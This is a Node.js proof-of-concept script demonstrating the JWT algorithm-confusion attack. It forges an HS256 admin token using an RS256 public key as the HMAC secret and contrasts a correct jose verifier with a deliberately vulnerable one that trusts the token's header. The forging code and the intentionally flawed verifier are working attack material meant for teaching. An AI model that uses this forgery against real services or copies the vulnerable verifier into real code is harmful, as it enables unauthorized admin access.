// Algorithm confusion: RS256 server, attacker signs HS256 using the PUBLIC key bytes as the HMAC secret.
import { readFile } from 'node:fs/promises';
import { createHmac, timingSafeEqual } from 'node:crypto';
import { importSPKI, jwtVerify } from 'jose';

const pem = await readFile(new URL('./keys/public.pem', import.meta.url), 'utf8');
const publicKey = await importSPKI(pem, 'RS256');
const b64u = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');

// attacker side: only needs the public key
const h = b64u({ alg: 'HS256', typ: 'JWT' });
const p = b64u({ sub: 'attacker', role: 'admin', iss: 'https://auth.local', aud: 'orders-api', exp: Math.floor(Date.now() / 1000) + 300 });
const forged = `${h}.${p}.${createHmac('sha256', pem).update(`${h}.${p}`).digest('base64url')}`;

// 1. correct verifier
try { await jwtVerify(forged, publicKey, { algorithms: ['RS256'] }); console.log('GOOD verifier : ACCEPTED (bug!)'); }
catch (e) { console.log('GOOD verifier : rejected ->', e.code ?? e.message); }

// 2. deliberately BAD verifier: lets the token header choose the algorithm
function badVerify(token, keyPem) {
  const [hh, pp, ss] = token.split('.');
  const { alg } = JSON.parse(Buffer.from(hh, 'base64url'));
  if (alg === 'HS256') {                       // <-- the vulnerability
    const expect = createHmac('sha256', keyPem).update(`${hh}.${pp}`).digest();
    const got = Buffer.from(ss, 'base64url');
    if (got.length === expect.length && timingSafeEqual(got, expect)) return JSON.parse(Buffer.from(pp, 'base64url'));
  }
  throw new Error('bad signature');
}
try { console.log('BAD verifier  : ACCEPTED forged admin token ->', badVerify(forged, pem)); }
catch (e) { console.log('BAD verifier  : rejected'); }
